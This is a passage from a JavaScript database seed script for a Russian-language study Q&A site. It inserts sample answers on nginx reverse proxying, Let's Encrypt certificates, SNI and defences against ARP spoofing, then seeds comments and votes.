      { qi: 16, author: 1, body: "Ключевое понятие — **reverse proxy** (обратный прокси). На сервере стоит nginx, который слушает порты 80/443 и направляет запросы нужному сайту на основе заголовка `Host`.\n\n**Пример nginx.conf:**\n\n```nginx\nserver {\n    listen 80;\n    server_name fixlib.ru www.fixlib.ru;\n    location / {\n        proxy_pass http://127.0.0.1:3000;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n    }\n}\n\nserver {\n    listen 80;\n    server_name mystudy.spbugt.ru;\n    location / {\n        proxy_pass http://127.0.0.1:3001;\n        proxy_set_header Host $host;\n        proxy_set_header X-Real-IP $remote_addr;\n    }\n}\n```\n\nСайты работают на разных внутренних портах (3000, 3001), но снаружи оба доступны на 80.", accepted: true, votes: 14 },
      { qi: 16, author: 3, body: "Дополню про SSL (HTTPS). Для двух доменов нужны два сертификата. Проще всего использовать **Let's Encrypt** с certbot:\n\n```bash\ncertbot --nginx -d fixlib.ru -d www.fixlib.ru\ncertbot --nginx -d mystudy.spbugt.ru\n```\n\nCertbot автоматически добавит SSL-блоки в конфиг nginx и настроит перенаправление HTTP→HTTPS.\n\nДля многих доменов можно использовать **nginx virtual host** с wildcard-сертификатом `*.example.com`.", votes: 7 },
      { qi: 16, author: 2, body: "Альтернативный подход — **SNI (Server Name Indication)**. Это расширение TLS, которое позволяет клиенту указать имя хоста при установке SSL-соединения. Без SNI на одном IP нельзя было бы обслуживать несколько HTTPS-сайтов.\n\nNginx поддерживает SNI из коробки, но важно помнить про это при настройке.", votes: 3 },
      // Q17: ARP-спуфинг
      { qi: 17, author: 1, body: "**Механика:** Attacker отправляет ARP-ответ «я — шлюз» с MAC-адресом атакующего. Жертва обновляет ARP-таблицу и шлёт трафик через атакующего.\n\n**Защита на коммутаторе:**\n- Dynamic ARP Inspection (DAI)\n- Port Security (статические MAC)\n\n**Защита на хосте:**\n- Статические ARP-записи\n- ARP-мониторинг (arpwatch)\n- VPN", accepted: true, votes: 5 },
    ];

    let answerCount = 0;
    let commentCount = 0;
    for (const ad of aData) {
      const q = questions[ad.qi];
      const a = await prisma.answer.create({
        data: {
          body: ad.body,
          questionId: q.id,
          authorId: users[ad.author].id,
          isAccepted: ad.accepted || false,
          voteCount: ad.votes || 0,
          createdAt: ruDate(Math.max(0, (qData[ad.qi].days || 10) - 1)),
        },
      });

      // Обновить счётчик ответов
      await prisma.question.update({
        where: { id: q.id },
        data: { answerCount: { increment: 1 } },
      });

      // Если ответ принят — обновить вопрос
      if (ad.accepted) {
        await prisma.question.update({
          where: { id: q.id },
          data: { isAnswered: true, acceptedAnswerId: a.id },
        });
      }

      // Добавить комментарий к некоторым ответам
      if (ad.qi === 0 && !ad.accepted) {
        await prisma.answerComment.create({
          data: {
            body: "Спасибо, теперь понятно с формулой 2^n!",
            answerId: a.id,
            authorId: users[ad.author].id,
          },
        });
        commentCount++;
      }
      if (ad.qi === 5) {
        await prisma.answerComment.create({
          data: {
            body: "Отличное объяснение с примером гитары! Записал в конспект.",
            answerId: a.id,
            authorId: users[4].id,
          },
        });
        commentCount++;
      }
      if (ad.qi === 8) {
        await prisma.answerComment.create({
          data: {
            body: "Добавлю: Second-order SQL injection — самый коварный тип. Данные проходят через БД «чистыми», но при повторном использовании становятся вредоносными.",
            answerId: a.id,
            authorId: users[3].id,
          },
        });
        commentCount++;
      }
      if (ad.qi === 10) {
        await prisma.answerComment.create({
          data: {
            body: "Аналогия с домом и комнатами — лучшее объяснение, которое я видел!",
            answerId: a.id,
            authorId: users[5].id,
          },
        });
        commentCount++;
      }
      answerCount++;
    }

    // ==================== ГОЛОСА ЗА ВОПРОСЫ ====================
    for (const qd of qData) {
      const q = questions[qData.indexOf(qd)];
      // Добавляем 1-3 голоса за вопрос
      for (let v = 0; v < Math.min(qd.votes - 1, 3); v++) {
        const voterIdx = (qd.author + v + 1) % users.length;
        await prisma.vote.create({
          data: {
            type: "UP",
            userId: users[voterIdx].id,
            questionId: q.id,
          },
        });
      }
    }

    return new Response(JSON.stringify({
      message: "База данных успешно заполнена",
      users: users.length,
      categories: categories.length,
      resources: resourceCount,
      terms: termCount,
      questions: questions.length,
      answers: answerCount,
      comments: commentCount,
    }), {
      status: 200,
      headers: { "Content-Type": "application/json" },
    });
  } catch (error) {
    console.error("Error seeding database:", error);
    return new Response(JSON.stringify({ error: "Ошибка при заполнении базы", details: error.message }), {
      status: 500,
      headers: { "Content-Type": "application/json" },
    });
  }
}
